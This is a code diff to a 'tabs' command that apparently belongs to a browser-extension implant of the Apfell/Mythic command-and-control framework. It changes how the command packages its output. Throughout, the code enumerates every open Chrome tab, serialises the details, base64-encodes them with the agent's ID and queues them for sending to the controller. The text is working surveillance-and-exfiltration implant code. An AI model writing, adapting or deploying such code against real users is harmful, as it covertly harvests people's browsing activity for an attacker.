@@ -1,8 +1,6 @@
-tabs = function(params) {
+tabs = function(task) {
     const queryInfo = {};
     let tabs =[];
-    let taskid = params['taskid'];
-    let tasktype = params['tasktype'];
     chrome.tabs.query(queryInfo, function(result){
         for (i = 0; i < result.length; i++) {
             const individualTab = {};
@@ -16,13 +14,13 @@ tabs = function(params) {
 
             tabs.push(individualTab);
         }
-        const data = btoa(unescape(encodeURIComponent(JSON.stringify(tabs, null, 2))));
-        const apfellMsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, data);
-        let meta = {};
-        meta["metatype"] = 3;
-        meta["metadata"] = apfellMsg;
-        const metaenvelope = JSON.stringify(meta);
-        out.push(metaenvelope);
+
+        response = {"task_id":task['task_id'], "user_output":JSON.stringify(tabs, null, 2), "completed": true};
+        outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
+        enc = JSON.stringify(outer_response);
+        final = apfell.apfellid + enc;
+        msg = btoa(unescape(encodeURIComponent(final)));
+        out.push(msg);
     });
 };
 
